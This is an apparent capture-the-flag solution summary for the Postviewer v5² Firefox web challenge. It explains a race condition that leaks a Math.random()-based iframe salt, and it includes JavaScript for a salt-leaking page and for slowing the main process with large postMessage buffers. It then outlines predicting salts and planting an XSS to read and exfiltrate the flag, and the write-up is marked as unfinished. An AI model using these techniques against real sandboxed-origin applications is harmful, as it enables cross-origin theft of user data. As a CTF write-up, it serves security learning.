# Postviewer v5² (FF) - Solution Summary

## Challenge Overview
- **URL**: https://wl3zck2n-postviewer5-ff.instancer.2025.ctfcompetition.com/
- **Type**: Web XSS/Race Condition
- **Difficulty**: High (only 2 teams solved the Chrome version)
- **Note**: Firefox version is easier due to simpler race condition

## Vulnerability Summary

The challenge has a race condition in how files are rendered in SafeContentFrame iframes. When files are rendered with `cached: false`, the salt is generated using `Math.random()`, which is:
1. Predictable (can be cracked)
2. Leaked through a race condition

## Attack Steps

### 1. Understanding the Architecture

Files are rendered in isolated iframes on `scf.usercontent.goog` with origins calculated as:
```
hash = SHA256("google-ctf" + "$@#|" + salt + "$@#|" + origin)
origin = https://<hash>-h748636364.scf.usercontent.goog/...
```

For `cached: false` files, salt = `getRandom(5)` which uses `Math.random()`.

### 2. The Race Condition

The rendering process:
1. App registers `onload` listener
2. Iframe loads and triggers `onload`
3. App sends `postMessage({body, salt}, iframeOrigin)`
4. Iframe processes and sends back `"Reloading iframe"`
5. App removes `onload` listener

**The Bug**: If we can trigger multiple `onload` events before step 5, the salt will be sent multiple times!

### 3. Winning the Race (Firefox)

Firefox makes this easier. The exploit:

```javascript
// 1. Share a salt-leaking HTML file (cached=false)
const saltLeaker = `
<script>
    window.onmessage = (e) => {
        if (e.data.salt) {
            window.opener.postMessage({
                type: 'leaked_salt',
                salt: Array.from(new Uint8Array(e.data.salt))
            }, '*');
        }
    };
<\/script>
`;
shareFile(saltLeaker, 'leaker.html', false);

// 2. Slow down the main process
const buff = new Uint8Array(3e7);
appWin.postMessage({ type: buff }, '*', [buff.buffer]);

// 3. Continue slowing down
setInterval(() => {
    const buff2 = new Uint8Array(2e7);
    appWin.postMessage({ type: buff2 }, '*', [buff2.buffer]);
}, 100);
```

When the main process is slowed down:
- The iframe can fully render before `"Reloading iframe"` is processed
- The `onload` event fires again
- Salt is sent to the now-rendered iframe
- Iframe leaks it back to attacker

### 4. Predicting Math.random()

Once we have leaked salts (which are generated from `Math.random()`):
1. Reverse the base36 encoding to get the random numbers
2. Use a Math.random() predictor for Firefox
3. Predict future salt values

### 5. Exploiting with Predicted Salt

1. Create an XSS payload HTML file
2. Set its filename to a predicted salt value
3. Share it as `cached: true` (so filename is used as salt)
4. When the flag file is rendered, it will share the same origin as our XSS
5. Our XSS can read the flag content

### 6. Full Exploit Chain

```
1. Bot adds flag (cached=false, uses Math.random() salt)
2. Bot visits our exploit page
3. Our page opens challenge window
4. Share salt-leaking file (cached=false)
5. Slow down main process
6. Win race, leak salt
7. Predict future Math.random() values
8. Share XSS with predicted salt as filename (cached=true)
9. Trigger flag rendering
10. XSS executes on same origin as flag
11. Read and exfiltrate flag
```

## Key Insights

1. **Process Isolation**: Slowing down the main process doesn't affect cross-origin iframes
2. **Firefox Easier**: In Firefox, slowing the process makes the race almost 100% winnable
3. **Math.random() Predictable**: Can be cracked with leaked values
4. **Filename as Salt**: When filename is longer than hash, it's used as salt
5. **Same-Origin Bypass**: Predicted salt allows XSS on same origin as flag

## Files Created

- `postviewer_analysis.md` - Initial analysis
- `postviewer_recon.py` - Reconnaissance script
- `postviewer_complete_exploit.html` - Full exploit implementation
- `POSTVIEWER_SOLUTION.md` - This file

## References

- Official Writeup: https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8
- CTFtime: http://ctftime.org/writeup/40351

## Next Steps

To complete the exploit:
1. Implement Math.random() predictor for Firefox
2. Calculate correct timing for race condition
3. Generate XSS payload with predicted salt
4. Test against live instance
5. Submit flag

## Status

Currently at step 3 - have identified the vulnerability and attack path. Need to implement the full Math.random() prediction and XSS payload generation to complete the exploit.
